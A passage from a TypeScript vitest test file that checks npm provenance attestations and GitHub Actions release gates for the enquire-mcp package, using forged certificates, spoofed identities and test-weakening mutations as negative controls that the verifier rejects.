      NPM_PROVENANCE_SLSA_CERTIFICATE,
      Buffer.from(NPM_PROVENANCE_OIDC_ISSUER, "utf8"),
      Buffer.from("https://token.actions.githubusercontent.dev", "utf8")
    );
    const exactV2IssuerValue = Buffer.concat([
      Buffer.from([0x0c, 0x2b]),
      Buffer.from(NPM_PROVENANCE_OIDC_ISSUER, "utf8")
    ]);
    const wrongV2IssuerValue = Buffer.concat([
      Buffer.from([0x0c, 0x2b]),
      Buffer.from("https://token.actions.githubusercontent.dev", "utf8")
    ]);
    const wrongV2IssuerCertificate = mutateNpmCertificateBytes(
      NPM_PROVENANCE_SLSA_UTF8_ISSUER_CERTIFICATE,
      exactV2IssuerValue,
      wrongV2IssuerValue
    );
    const dualIssuerConflictCertificate = mutateNpmCertificateBytes(
      NPM_PROVENANCE_SLSA_DUAL_ISSUER_CERTIFICATE,
      exactV2IssuerValue,
      wrongV2IssuerValue
    );
    const duplicateIssuerCertificate = mutateNpmCertificateBytes(
      NPM_PROVENANCE_SLSA_DUAL_ISSUER_CERTIFICATE,
      Buffer.from("060a2b0601040183bf300108", "hex"),
      Buffer.from("060a2b0601040183bf300101", "hex")
    );
    const malformedIssuerLengthCertificate = mutateNpmCertificateBytes(
      NPM_PROVENANCE_SLSA_UTF8_ISSUER_CERTIFICATE,
      Buffer.from("0c2b68747470", "hex"),
      Buffer.from("0c2c68747470", "hex")
    );
    const malformedIssuerWrapperCertificate = mutateNpmCertificateBytes(
      NPM_PROVENANCE_SLSA_UTF8_ISSUER_CERTIFICATE,
      Buffer.from("0c2b68747470", "hex"),
      Buffer.from("162b68747470", "hex")
    );
    const malformedIssuerValueCertificate = mutateNpmCertificateBytes(
      NPM_PROVENANCE_SLSA_UTF8_ISSUER_CERTIFICATE,
      Buffer.from("0c2b68747470", "hex"),
      Buffer.from("0c2bff747470", "hex")
    );
    for (const [rawBytes, expectedError] of [
      [NPM_PROVENANCE_SLSA_CERTIFICATE_WITHOUT_ISSUER, "certificate lacks a supported Fulcio OIDC issuer extension"],
      [wrongLegacyIssuerCertificate, "Fulcio legacy OIDC issuer is not GitHub Actions"],
      [wrongV2IssuerCertificate, "Fulcio v2 OIDC issuer is not GitHub Actions"],
      [dualIssuerConflictCertificate, "Fulcio v2 OIDC issuer is not GitHub Actions"],
      [duplicateIssuerCertificate, "certificate contains duplicate Fulcio legacy OIDC issuer extensions"],
      [malformedIssuerLengthCertificate, "Fulcio v2 OIDC issuer has a DER element outside its parent boundary"],
      [malformedIssuerWrapperCertificate, "Fulcio v2 OIDC issuer must contain exactly one DER UTF8String"],
      [malformedIssuerValueCertificate, "Fulcio v2 OIDC issuer must contain canonical UTF-8"]
    ] as const) {
      expect(() =>
        evaluateNpmProvenanceAttestations(reportWithCertificate(rawBytes), npmProvenanceExpected(true))
      ).toThrow(expectedError);
    }

    const signingModeMutations: unknown[][] = [
      [
        npmAttestationBundle(NPM_PROVENANCE_PUBLISH_PREDICATE, npmPublishStatement(), {
          verificationMaterial: npmSlsaVerificationMaterial()
        }),
        slsaBundle
      ],
      [
        publishBundle,
        npmAttestationBundle(NPM_PROVENANCE_SLSA_PREDICATE, npmSlsaStatement(), {
          verificationMaterial: npmPublishVerificationMaterial()
        })
      ],
      [
        npmAttestationBundle(NPM_PROVENANCE_PUBLISH_PREDICATE, npmPublishStatement(), {
          signatures: [{ sig: "dGVzdA==", keyid: `SHA256:${"A".repeat(43)}` }]
        }),
        slsaBundle
      ],
      [
        npmAttestationBundle(NPM_PROVENANCE_PUBLISH_PREDICATE, npmPublishStatement(), {
          signatures: [{ sig: "dGVzdA==", keyid: "" }]
        }),
        slsaBundle
      ],
      [
        publishBundle,
        npmAttestationBundle(NPM_PROVENANCE_SLSA_PREDICATE, npmSlsaStatement(), {
          signatures: [{ sig: "dGVzdA==", keyid: NPM_PROVENANCE_PUBLISH_KEY_HINT }]
        })
      ],
      [
        publishBundle,
        npmAttestationBundle(NPM_PROVENANCE_SLSA_PREDICATE, npmSlsaStatement(), {
          verificationMaterial: npmSlsaVerificationMaterial([])
        })
      ],
      [
        publishBundle,
        npmAttestationBundle(NPM_PROVENANCE_SLSA_PREDICATE, npmSlsaStatement(), {
          verificationMaterial: npmSlsaVerificationMaterial([
            { rawBytes: NPM_PROVENANCE_SLSA_CERTIFICATE },
            { rawBytes: NPM_PROVENANCE_SLSA_CERTIFICATE }
          ])
        })
      ],
      [
        publishBundle,
        npmAttestationBundle(NPM_PROVENANCE_SLSA_PREDICATE, npmSlsaStatement(), {
          verificationMaterial: npmSlsaVerificationMaterial([{ rawBytes: "not-base64" }])
        })
      ],
      [
        npmAttestationBundle(NPM_PROVENANCE_PUBLISH_PREDICATE, npmPublishStatement(), {
          verificationMaterial: {
            publicKey: { hint: NPM_PROVENANCE_PUBLISH_KEY_HINT },
            tlogEntries: [],
            timestampVerificationData: {}
          }
        }),
        slsaBundle
      ],
      [
        publishBundle,
        npmAttestationBundle(NPM_PROVENANCE_SLSA_PREDICATE, npmSlsaStatement(), {
          verificationMaterial: {
            x509CertificateChain: {
              certificates: [{ rawBytes: NPM_PROVENANCE_SLSA_CERTIFICATE }]
            },
            tlogEntries: [{}],
            timestampVerificationData: null
          }
        })
      ]
    ];
    for (const bundles of signingModeMutations) {
      expect(() =>
        evaluateNpmProvenanceAttestations(npmProvenanceReport({ bundles }), npmProvenanceExpected(true))
      ).toThrow();
    }
  }

  // Negative control: both signed statements bind exact package bytes and source identity.
  {
    const otherDigest = "cd".repeat(64);
    const publishMutations: NpmPublishStatementOptions[] = [
      { statementType: "https://in-toto.io/Statement/v1" },
      { subject: npmProvenanceSubject("pkg:npm/enquire-mcp@4.0.0-rc.2") },
      { subject: npmProvenanceSubject(undefined, otherDigest) },
      { subject: [...npmProvenanceSubject(), ...npmProvenanceSubject()] },
      { predicateType: NPM_PROVENANCE_SLSA_PREDICATE },
      { name: "@oomkapwn/not-enquire" },
      { version: "4.0.0-rc.1" },
      { registry: "https://registry.npmjs.org/" }
    ];
    for (const publish of publishMutations) {
      expect(() =>
        evaluateNpmProvenanceAttestations(npmProvenanceReport({ publish }), npmProvenanceExpected(true))
      ).toThrow();
    }

    const slsaMutations: NpmSlsaStatementOptions[] = [
      { statementType: "https://in-toto.io/Statement/v0.1" },
      { subject: npmProvenanceSubject("pkg:npm/enquire-mcp@4.0.0-rc.2") },
      { subject: npmProvenanceSubject(undefined, otherDigest) },
      { subject: [...npmProvenanceSubject(), ...npmProvenanceSubject()] },
      { predicateType: NPM_PROVENANCE_PUBLISH_PREDICATE },
      { buildType: "https://example.invalid/build/v1" },
      { workflowRef: "refs/heads/main" },
      { workflowRepository: "https://github.com/attacker/enquire-mcp" },
      { workflowPath: ".github/workflows/other.yml" },
      { eventName: "workflow_dispatch" },
      { repositoryId: "1" },
      { repositoryOwnerId: "1" },
      { dependencyUri: "git+https://github.com/oomkapwn/enquire-mcp@refs/heads/main" },
      { gitCommit: "352c54c0e0d4939c9f7b93470a4a2d7c7a0ac78c" },
      { builderId: "https://example.invalid/runner" }
    ];
    for (const slsa of slsaMutations) {
      expect(() =>
        evaluateNpmProvenanceAttestations(npmProvenanceReport({ slsa }), npmProvenanceExpected(true))
      ).toThrow();
    }
  }

  // Fresh publication requires this invocation; reuse permits only a canonical historical invocation.
  for (const slsa of [
    { runId: "30000000001", runAttempt: NPM_PROVENANCE_RUN_ATTEMPT },
    { runId: NPM_PROVENANCE_RUN_ID, runAttempt: "1" }
  ]) {
    expect(() =>
      evaluateNpmProvenanceAttestations(npmProvenanceReport({ slsa }), npmProvenanceExpected(true))
    ).toThrow();
  }

  for (const slsa of [
    { runId: "0", runAttempt: "1" },
    { runId: "01", runAttempt: "1" },
    { runId: "9007199254740992", runAttempt: "1" },
    { runId: "30000000001", runAttempt: "0" },
    { runId: "30000000001", runAttempt: "01" },
    { invocationId: "https://github.com/oomkapwn/enquire-mcp/actions/runs/30000000001" },
    { invocationId: "https://github.com/attacker/enquire-mcp/actions/runs/30000000001/attempts/1" }
  ]) {
    expect(() =>
      evaluateNpmProvenanceAttestations(npmProvenanceReport({ slsa }), npmProvenanceExpected(false))
    ).toThrow();
  }

  // Negative control: caller-supplied expected identity cannot weaken the signed contract.
  for (const expected of [
    npmProvenanceExpected(true, { name: "@oomkapwn/not-enquire" }),
    npmProvenanceExpected(true, { version: "4.0.0-rc.1" }),
    npmProvenanceExpected(true, { integrity: `sha512-${Buffer.from("cd".repeat(64), "hex").toString("base64")}` }),
    npmProvenanceExpected(true, { sourceSha: "352c54c0e0d4939c9f7b93470a4a2d7c7a0ac78c" }),
    npmProvenanceExpected(true, { tag: "v4.0.0-rc.1" }),
    npmProvenanceExpected(true, { currentRunId: "30000000001" }),
    npmProvenanceExpected(true, { currentRunAttempt: "1" }),
    { ...npmProvenanceExpected(true), publishAttempted: "true" },
    { ...npmProvenanceExpected(true), extra: "not-allowed" }
  ]) {
    expect(() => evaluateNpmProvenanceAttestations(npmProvenanceReport(), expected)).toThrow();
  }
}

describe("release identity and exact required-job gate", () => {
  it("accepts only the tag derived from package.json version", () => {
    expect(assertReleaseTagMatchesVersion("v3.12.0-rc.10", "3.12.0-rc.10")).toBe("v3.12.0-rc.10");
  });

  it("rejects a different or missing trigger tag (NEGATIVE control)", () => {
    expect(() => assertReleaseTagMatchesVersion("v3.12.0-rc.9", "3.12.0-rc.10")).toThrow(
      /does not match package version/
    );
    expect(() => assertReleaseTagMatchesVersion("", "3.12.0-rc.10")).toThrow(/tag is missing/);
  });

  it("requires one successful job for every exact context", () => {
    expect(evaluateChecks(allSuccessful())).toEqual({
      state: "ready",
      succeeded: REQUIRED_RELEASE_CHECKS,
      missing: [],
      pending: [],
      failed: []
    });
  });

  it("does not let an extra job hide a missing context (NEGATIVE control)", () => {
    const jobs = allSuccessful().filter((item) => item.name !== "oia");
    jobs.push(job("lint-extra", 22));
    const result = evaluateChecks(jobs);
    expect(result.state).toBe("pending");
    expect(result.succeeded).toHaveLength(REQUIRED_RELEASE_CHECKS.length - 1);
    expect(result.missing).toEqual(["oia"]);
  });

  it("selects the unique maximum attempt per name independent of response order", () => {
    const rerun = { ...TRUSTED_CI_RUN, run_attempt: 2 };
    const oldSuccessNewFailure = [...allSuccessful(), job("coverage", 40, "failure", "completed", 2)];
    const expectedFailure = {
      state: "failed",
      failed: [{ name: "coverage", conclusion: "failure" }]
    };
    expect(evaluateReleaseChecks(oldSuccessNewFailure, rerun, TRUSTED_SOURCE_SHA)).toMatchObject(expectedFailure);
    expect(evaluateReleaseChecks([...oldSuccessNewFailure].reverse(), rerun, TRUSTED_SOURCE_SHA)).toMatchObject(
      expectedFailure
    );

    const oldFailureNewSuccess = allSuccessful().map((item) =>
      item.name === "coverage" ? job("coverage", 41, "failure") : item
    );
    oldFailureNewSuccess.push(job("coverage", 42, "success", "completed", 2));
    expect(evaluateReleaseChecks(oldFailureNewSuccess, rerun, TRUSTED_SOURCE_SHA).state).toBe("ready");
    expect(evaluateReleaseChecks([...oldFailureNewSuccess].reverse(), rerun, TRUSTED_SOURCE_SHA).state).toBe("ready");

    const pendingMaximum = [...allSuccessful(), job("docs", 43, null, "in_progress", 2)];
    expect(evaluateReleaseChecks(pendingMaximum, rerun, TRUSTED_SOURCE_SHA)).toMatchObject({
      state: "pending",
      pending: ["docs"]
    });

    const duplicateMaximum = [
      ...allSuccessful(),
      job("audit", 44, "success", "completed", 2),
      job("audit", 45, "success", "completed", 2)
    ];
    expect(() => evaluateReleaseChecks(duplicateMaximum, rerun, TRUSTED_SOURCE_SHA)).toThrow(
      /duplicate required CI job in exact workflow-run attempt 2: audit/
    );

    const duplicateOldAttempt = [
      ...allSuccessful(),
      job("smoke", 46, "failure"),
      job("smoke", 47, "success", "completed", 2)
    ];
    expect(evaluateReleaseChecks(duplicateOldAttempt, rerun, TRUSTED_SOURCE_SHA).state).toBe("ready");

    for (const id of [undefined, 0, 1.5, Number.MAX_SAFE_INTEGER + 1, "30726087813"]) {
      expect(() => evaluateReleaseChecks(allSuccessful(), { ...TRUSTED_CI_RUN, id }, TRUSTED_SOURCE_SHA)).toThrow(
        /trusted CI workflow run identity diverged/
      );
    }
    for (const divergentRun of [
      { ...TRUSTED_CI_RUN, name: "Other" },
      { ...TRUSTED_CI_RUN, path: ".github/workflows/other.yml" },
      { ...TRUSTED_CI_RUN, event: "workflow_dispatch" },
      { ...TRUSTED_CI_RUN, head_branch: "topic" },
      { ...TRUSTED_CI_RUN, head_sha: "f".repeat(40) },
      { ...TRUSTED_CI_RUN, run_attempt: 0 },
      { ...TRUSTED_CI_RUN, run_attempt: 1.5 },
      { ...TRUSTED_CI_RUN, status: "" }
    ]) {
      expect(() => evaluateReleaseChecks(allSuccessful(), divergentRun, TRUSTED_SOURCE_SHA)).toThrow(
        /trusted CI workflow run identity diverged/
      );
    }
    expect(() => evaluateReleaseChecks(allSuccessful(), TRUSTED_CI_RUN, "f".repeat(40))).toThrow(
      /trusted CI workflow run identity diverged/
    );

    const valid = allSuccessful();
    for (const foreign of [
      { ...job("coverage", 60), id: 0 },
      { ...job("coverage", 60), id: Number.MAX_SAFE_INTEGER + 1 },
      { ...job("coverage", 60), run_id: String(TRUSTED_CI_RUN.id) },
      { ...job("coverage", 60), run_id: TRUSTED_CI_RUN.id + 1 },
      { ...job("coverage", 60), run_attempt: 2 },
      { ...job("coverage", 60), head_sha: "f".repeat(40) },
      { ...job("coverage", 60), workflow_name: "Other" }
    ]) {
      expect(() => evaluateReleaseChecks([...valid, foreign], TRUSTED_CI_RUN, TRUSTED_SOURCE_SHA)).toThrow(
        /coverage diverged from the exact workflow-run identity/
      );
    }
    const duplicateId = allSuccessful().map((item) =>
      item.name === "audit" ? { ...item, id: allSuccessful()[0]?.id ?? 1 } : item
    );
    expect(() => evaluateChecks(duplicateId)).toThrow(/duplicate CI job id/);
    expect(() => evaluateChecks([{ name: "unrelated" } as unknown as WorkflowJob, ...allSuccessful()])).toThrow(
      /CI job unrelated diverged/
    );
    expect(() => evaluateReleaseChecks({}, TRUSTED_CI_RUN, TRUSTED_SOURCE_SHA)).toThrow(/must be an array/);
    expect(
      evaluateReleaseChecks(allSuccessful(), { ...TRUSTED_CI_RUN, status: "in_progress" }, TRUSTED_SOURCE_SHA)
    ).toMatchObject({ state: "pending", pending: ["CI workflow run"] });
  });

  it("distinguishes in-progress from completed non-success jobs", () => {
    const pending = allSuccessful().map((item) => (item.name === "docs" ? job("docs", 50, null, "in_progress") : item));
    expect(evaluateChecks(pending)).toMatchObject({ state: "pending", pending: ["docs"] });

    const skipped = allSuccessful().map((item) => (item.name === "smoke" ? job("smoke", 51, "skipped") : item));
    expect(evaluateChecks(skipped)).toMatchObject({
      state: "failed",
      failed: [{ name: "smoke", conclusion: "skipped" }]
    });

    const release = {
      id: 10,
      tag_name: "v4.0.0-rc.2",
      draft: true,
      prerelease: true
    };
    const asset = releaseAsset("candidate.mcpb", 11);
    expect(flattenPaginatedArrays([[]], "release")).toEqual([]);
    expect(flattenPaginatedArrays([[]], "asset")).toEqual([]);
    expect(flattenPaginatedArrays([[release], [{ ...release, id: 12 }]], "release")).toEqual([
      release,
      { ...release, id: 12 }
    ]);
    expect(flattenPaginatedArrays([[asset]], "asset")).toEqual([asset]);
    expect(() => flattenPaginatedArrays([[release], [{ ...release }]], "release")).toThrow(/duplicate id/);
    expect(() => flattenPaginatedArrays([[asset], [{ ...asset, name: "other.mcpb" }]], "asset")).toThrow(
      /duplicate id/
    );

    for (const malformed of [[], {}, null, [null], [{}], [[null]], [[{}]]]) {
      expect(() => flattenPaginatedArrays(malformed, "release")).toThrow(/paginated/);
    }
    for (const invalidRelease of [
      { ...release, id: 0 },
      { ...release, id: 1.5 },
      { ...release, id: Number.MAX_SAFE_INTEGER + 1 },
      { ...release, id: "10" },
      { ...release, tag_name: "" },
      { ...release, draft: "true" },
      { ...release, prerelease: "true" },
      { ...release, prerelease: undefined }
    ]) {
      expect(() => flattenPaginatedArrays([[invalidRelease]], "release")).toThrow(/invalid identity/);
    }
    for (const invalidAsset of [
      { ...asset, id: 0 },
      { ...asset, id: 1.5 },
      { ...asset, id: Number.MAX_SAFE_INTEGER + 1 },
      { ...asset, id: "11" },
      { ...asset, name: "" },
      { ...asset, state: "" },
      { ...asset, content_type: "" },
      { ...asset, size: -1 },
      { ...asset, size: 1.5 },
      { ...asset, size: Number.MAX_SAFE_INTEGER + 1 },
      { ...asset, size: "11" },
      { ...asset, digest: 42 },
      { ...asset, digest: `sha256:${"A".repeat(64)}` },
      { ...asset, digest: "sha256:short" }
    ]) {
      expect(() => flattenPaginatedArrays([[invalidAsset]], "asset")).toThrow(/invalid identity/);
    }
    expect(flattenPaginatedArrays([[{ ...asset, digest: null }]], "asset")).toEqual([{ ...asset, digest: null }]);

    const run = { ...TRUSTED_CI_RUN };
    expect(flattenPaginatedField([{ total_count: 0, workflow_runs: [] }], "workflow_runs")).toEqual([]);
    expect(
      flattenPaginatedField(
        [
          { total_count: 2, workflow_runs: [run] },
          { total_count: 2, workflow_runs: [{ ...run, id: run.id + 1 }] }
        ],
        "workflow_runs"
      )
    ).toEqual([run, { ...run, id: run.id + 1 }]);
    const oneJob = job("lint", 70);
    expect(flattenPaginatedField([{ total_count: 1, jobs: [oneJob] }], "jobs")).toEqual([oneJob]);
    const oneArtifact = {
      id: 71,
      name: "mcpb-basic-candidate-1",
      expired: false,
      digest: `sha256:${"7".repeat(64)}`
    };
    expect(flattenPaginatedField([{ total_count: 1, artifacts: [oneArtifact] }], "artifacts")).toEqual([oneArtifact]);
    expect(() =>
      flattenPaginatedField(
        [
          { total_count: 2, workflow_runs: [run] },
          { total_count: 2, workflow_runs: [{ ...run }] }
        ],
        "workflow_runs"
      )
    ).toThrow(/duplicate id/);
    expect(() =>
      flattenPaginatedField([{ total_count: 2, jobs: [oneJob, { ...oneJob, name: "other" }] }], "jobs")
    ).toThrow(/duplicate id/);
    expect(() =>
      flattenPaginatedField(
        [{ total_count: 2, artifacts: [oneArtifact, { ...oneArtifact, name: "other" }] }],
        "artifacts"
      )
    ).toThrow(/duplicate id/);
    for (const malformed of [
      [],
      {},
      null,
      [[]],
      [{}],
      [{ total_count: -1, workflow_runs: [] }],
      [{ total_count: 1.5, workflow_runs: [] }],
      [{ total_count: Number.MAX_SAFE_INTEGER + 1, workflow_runs: [] }],
      [{ total_count: "0", workflow_runs: [] }],
      [{ total_count: 0, workflow_runs: null }],
      [{ total_count: 1, workflow_runs: [null] }],
      [{ total_count: 1, workflow_runs: [[]] }],
      [{ total_count: 1, workflow_runs: [{}] }],
      [{ total_count: 0, workflow_runs: [run] }],
      [{ total_count: 2, workflow_runs: [run] }],
      [
        { total_count: 2, workflow_runs: [run] },
        { total_count: 3, workflow_runs: [{ ...run, id: run.id + 1 }] }
      ]
    ]) {
      expect(() => flattenPaginatedField(malformed, "workflow_runs")).toThrow(/paginated/);
    }
    for (const malformedRun of [
      { ...run, id: 0 },
      { ...run, id: "1" },
      { ...run, id: Number.MAX_SAFE_INTEGER + 1 },
      { ...run, name: "" },
      { ...run, path: "" },
      { ...run, event: "" },
      { ...run, head_branch: "" },
      { ...run, head_sha: "not-a-sha" },
      { ...run, run_attempt: 0 },
      { ...run, run_attempt: 1.5 },
      { ...run, run_attempt: Number.MAX_SAFE_INTEGER + 1 },
      { ...run, run_attempt: "1" },
      { ...run, status: "" }
    ]) {
      expect(() => flattenPaginatedField([{ total_count: 1, workflow_runs: [malformedRun] }], "workflow_runs")).toThrow(
        /invalid identity/
      );
    }
    for (const malformedJob of [
      { ...oneJob, id: "70" },
      { ...oneJob, id: 0 },
      { ...oneJob, id: 1.5 },
      { ...oneJob, id: Number.MAX_SAFE_INTEGER + 1 },
      { ...oneJob, name: "" },
      { ...oneJob, run_id: 0 },
      { ...oneJob, run_id: 1.5 },
      { ...oneJob, run_id: Number.MAX_SAFE_INTEGER + 1 },
      { ...oneJob, run_id: String(oneJob.run_id) },
      { ...oneJob, run_attempt: 0 },
      { ...oneJob, run_attempt: 1.5 },
      { ...oneJob, run_attempt: Number.MAX_SAFE_INTEGER + 1 },
      { ...oneJob, run_attempt: "1" },
      { ...oneJob, head_sha: "not-a-sha" },
      { ...oneJob, workflow_name: "" },
      { ...oneJob, status: "" },
      { ...oneJob, conclusion: 1 }
    ]) {
      expect(() => flattenPaginatedField([{ total_count: 1, jobs: [malformedJob] }], "jobs")).toThrow(
        /invalid identity/
      );
    }
    for (const malformedArtifact of [
      { ...oneArtifact, id: 0 },
      { ...oneArtifact, id: 1.5 },
      { ...oneArtifact, id: Number.MAX_SAFE_INTEGER + 1 },
      { ...oneArtifact, id: "71" },
      { ...oneArtifact, name: "" },
      { ...oneArtifact, expired: "false" },
      { ...oneArtifact, digest: undefined },
      { ...oneArtifact, digest: 42 },
      { ...oneArtifact, digest: `sha256:${"A".repeat(64)}` }
    ]) {
      expect(() => flattenPaginatedField([{ total_count: 1, artifacts: [malformedArtifact] }], "artifacts")).toThrow(
        /invalid identity/
      );
    }
    expect(
      flattenPaginatedField([{ total_count: 1, artifacts: [{ ...oneArtifact, digest: null }] }], "artifacts")
    ).toEqual([{ ...oneArtifact, digest: null }]);
    expect(() => flattenPaginatedField([{ total_count: 0, other: [] }], "workflow_runs")).toThrow(/invalid envelope/);
    expect(() => flattenPaginatedField([{ total_count: 0, workflow_runs: [] }], "unknown")).toThrow(
      /unknown paginated/
    );
  });

  // This mutation oracle intentionally exercises thousands of structural checks.
  // PR #433 V8 coverage crossed the former 30s ceiling after the source-audit,
  // runner-reachability, and binding controls; keep scoped 60s hang detection.
  it("keeps release.yml wired to the shared evaluator and an exact mirrored inventory", () => {
    assertMcpRegistryEvaluatorContract();
    assertNpmProvenanceEvaluatorContract();
    let replacementCallbackCalls = 0;
    const countingReplacement: MutationReplacer = () => {
      replacementCallbackCalls++;
      return "omega";
    };

    expect(() => replaceExactly("alpha", "missing", countingReplacement)).toThrow(
      /expected 1 occurrence\(s\), found 0/
    );
    expect(() => replaceExactly("current-shape", "stale-shape", "omega")).toThrow(
      /expected 1 occurrence\(s\), found 0/
    );
    expect(() => replaceExactly("alpha alpha", "alpha", countingReplacement)).toThrow(
      /expected 1 occurrence\(s\), found 2/
    );
    expect(() => replaceAllExactly("alpha", "missing", countingReplacement)).toThrow(
      /expected 1 occurrence\(s\), found 0/
    );
    expect(() => replaceAllExactly("alpha alpha", "alpha", countingReplacement)).toThrow(
      /expected 1 occurrence\(s\), found 2/
    );
    expect(replacementCallbackCalls).toBe(0);
    expect(() => replaceExactly("alpha", "", "omega")).toThrow(/must not be empty/);
    expect(() => replaceExactly("alpha", "alpha", "omega", 0)).toThrow(/positive safe integer/);
    expect(() => replaceExactly("alpha", "alpha", "omega", 1.5)).toThrow(/positive safe integer/);
    expect(() => replaceExactly("alpha", "alpha", "omega", Number.MAX_SAFE_INTEGER + 1)).toThrow(
      /positive safe integer/
    );
    expect(() => replaceExactly("alpha", "alpha", "alpha")).toThrow(/did not change its source/);
    expect(() => replaceAllExactly("alpha", "alpha", "alpha")).toThrow(/did not change its source/);
    expect(replaceExactly("alpha alpha", "alpha", "omega", 2)).toBe("omega alpha");
    expect(replaceAllExactly("alpha alpha", "alpha", "omega", 2)).toBe("omega omega");
    expect(replaceExactly("left alpha right", "alpha", "$`|$&|$'|$$")).toBe("left left |alpha| right|$ right");
    expect(replaceExactly("alpha", "alpha", "$1|$01|$<name>|$0")).toBe("$1|$01|$<name>|$0");
    expect(replaceExactly("alpha", "alpha", () => "$&")).toBe("$&");
    expect(() => replaceExactly("alpha", "alpha", "$&")).toThrow(/did not change its source/);
    expect(
      replaceExactly("alpha", "ph", (_match: string, offset: number, whole: string) => `PH@${offset}/${whole.length}`)
    ).toBe("alPH@2/5a");
    const literalReplacementOffsets: number[] = [];
    expect(
      replaceAllExactly(
        "a-a",
        "a",
        (_match: string, offset: number) => {
          literalReplacementOffsets.push(offset);
          return "b";
        },
        2
      )
    ).toBe("b-b");
    expect(literalReplacementOffsets).toEqual([0, 2]);
    expect(replaceAllExactly("a-a", "a", "$`|$&|$'", 2)).toBe("|a|-a-a-|a|");

    const oracleSource = readFileSync(new URL("./release-integrity.test.ts", import.meta.url), "utf8");
    expect(rawMutationCallProblems(oracleSource)).toEqual([]);
    expect(rawMutationCallProblems("type Replacer = Parameters<typeof String.prototype.replace>[1];")).toEqual([]);
    expect(rawMutationCallProblems('const weakened = workflow.replace("old", "new");')).toEqual([
      expect.stringMatching(/raw \.replace\(\) mutation/)
    ]);
    expect(rawMutationCallProblems('const weakened = workflow["replaceAll"]("old", "new");')).toEqual([
      expect.stringMatching(/raw \.replaceAll\(\) mutation/)
    ]);
    expect(rawMutationCallProblems('const rawMutation = workflow[("replace")];')).toEqual([
      expect.stringMatching(/raw \.replace\(\) mutation/)
    ]);
    expect(rawMutationCallProblems("const rawMutation = workflow.replace;")).toEqual([
      expect.stringMatching(/raw \.replace\(\) mutation/)
    ]);
    expect(rawMutationCallProblems('const { ["replace"]: rawMutation } = workflow;')).toEqual([
      expect.stringMatching(/raw \.replace\(\) mutation/)
    ]);
    expect(rawMutationCallProblems("const { replace: rawMutation } = workflow;")).toEqual([
      expect.stringMatching(/raw \.replace\(\) mutation/)
    ]);
    expect(rawMutationCallProblems("const rawMutation = String.prototype.replace;")).toEqual([
      expect.stringMatching(/raw \.replace\(\) mutation/)
    ]);
    expect(
      rawMutationCallProblems(
        'function replaceExactly(source: string): string { return source.replace("old", "new"); }'
      )
    ).toEqual([expect.stringMatching(/raw \.replace\(\) mutation/)]);

    expect(releaseMutationInventoryProblems(oracleSource)).toEqual([]);
    const matrixStartOffset = oracleSource.indexOf(RELEASE_MUTATION_MATRIX_START);
    expect(matrixStartOffset).toBeGreaterThan(0);
    const matrixBodyOffset = matrixStartOffset + RELEASE_MUTATION_MATRIX_START.length;
    const suiteStart = `describe("${RELEASE_MUTATION_MATRIX_SUITE_TITLE}", () => {`;
    const suiteStartOffset = oracleSource.indexOf(suiteStart);
    expect(suiteStartOffset).toBeGreaterThan(0);
    const vitestImport = 'import { describe, expect, it } from "vitest";';
    const vitestImportOffset = oracleSource.indexOf(vitestImport);
    expect(vitestImportOffset).toBeGreaterThan(0);
    const aliasedVitestImportMutation = [
      oracleSource.slice(0, vitestImportOffset),
      'import { describe as it, expect, it as describe } from "vitest";',
      oracleSource.slice(vitestImportOffset + vitestImport.length)
    ].join("");
    expect(releaseMutationInventoryProblems(aliasedVitestImportMutation)).toContainEqual(
      expect.stringMatching(/must bind describe\/it to one exact unaliased vitest import with no runtime shadows/)
    );
    const releasePlanImport = 'import { ReleaseMutationPlan } from "./release-mutation-plan.js";';
    const releasePlanImportOffset = oracleSource.indexOf(releasePlanImport);
    expect(releasePlanImportOffset).toBeGreaterThan(0);
    const aliasedReleasePlanImport = [
      oracleSource.slice(0, releasePlanImportOffset),
      'import { ReleaseMutationPlan as AliasedPlan } from "./release-mutation-plan.js";',
      oracleSource.slice(releasePlanImportOffset + releasePlanImport.length)
    ].join("");
    expect(releaseMutationInventoryProblems(aliasedReleasePlanImport)).toContainEqual(
      expect.stringMatching(/must bind ReleaseMutationPlan to one exact unaliased test-support import/)
    );
    const shadowedItBindingMutation = [
      oracleSource.slice(0, suiteStartOffset + suiteStart.length),
      "\n  const it = (_name: string, _callback: () => void, _timeout?: number): void => undefined;",
      oracleSource.slice(suiteStartOffset + suiteStart.length)
    ].join("");
    expect(releaseMutationInventoryProblems(shadowedItBindingMutation)).toContainEqual(
      expect.stringMatching(/must bind describe\/it to one exact unaliased vitest import with no runtime shadows/)
    );
    const shadowedReleasePlanBinding = [
      oracleSource.slice(0, suiteStartOffset + suiteStart.length),
      "\n  const ReleaseMutationPlan = class {};",
      oracleSource.slice(suiteStartOffset + suiteStart.length)
    ].join("");
    expect(releaseMutationInventoryProblems(shadowedReleasePlanBinding)).toContainEqual(
      expect.stringMatching(/must bind ReleaseMutationPlan to one exact unaliased test-support import/)
    );
    const skippedSuiteMutation = [
      oracleSource.slice(0, suiteStartOffset),
      "describe.skip(",
      oracleSource.slice(suiteStartOffset + "describe(".length)
    ].join("");
    expect(releaseMutationInventoryProblems(skippedSuiteMutation)).toContain(
      "release mutation matrix must be one direct unskipped top-level describe/it registration with zero-argument block callbacks and the exact 60_000ms timeout"
    );
    const outerReturnMutation = [
      oracleSource.slice(0, suiteStartOffset + suiteStart.length),
      "\n  return;",
      oracleSource.slice(suiteStartOffset + suiteStart.length)
    ].join("");
    expect(releaseMutationInventoryProblems(outerReturnMutation)).toContainEqual(
      expect.stringMatching(/suite callback must not return before matrix registration/)
    );
    const matrixRegistrationStart = `  it("${RELEASE_MUTATION_MATRIX_TEST_TITLE}", () => {`;
    const matrixRegistrationOffset = oracleSource.indexOf(matrixRegistrationStart);
    expect(matrixRegistrationOffset).toBeGreaterThan(suiteStartOffset);
    const conditionalRegistrationMutation = [
      oracleSource.slice(0, matrixRegistrationOffset),
      "  false && it(",
      oracleSource.slice(matrixRegistrationOffset + "  it(".length)
    ].join("");
    expect(releaseMutationInventoryProblems(conditionalRegistrationMutation)).toContain(
      "release mutation matrix must be one direct unskipped top-level describe/it registration with zero-argument block callbacks and the exact 60_000ms timeout"
    );
    const contextSkipMutation = [
      oracleSource.slice(0, matrixRegistrationOffset),
      `  it("${RELEASE_MUTATION_MATRIX_TEST_TITLE}", (ctx) => { ctx.skip();`,
      oracleSource.slice(matrixRegistrationOffset + matrixRegistrationStart.length)
    ].join("");
    expect(releaseMutationInventoryProblems(contextSkipMutation)).toContain(
      "release mutation matrix must be one direct unskipped top-level describe/it registration with zero-argument block callbacks and the exact 60_000ms timeout"
    );
    const extraProjectMutation = [
      oracleSource.slice(0, matrixBodyOffset),
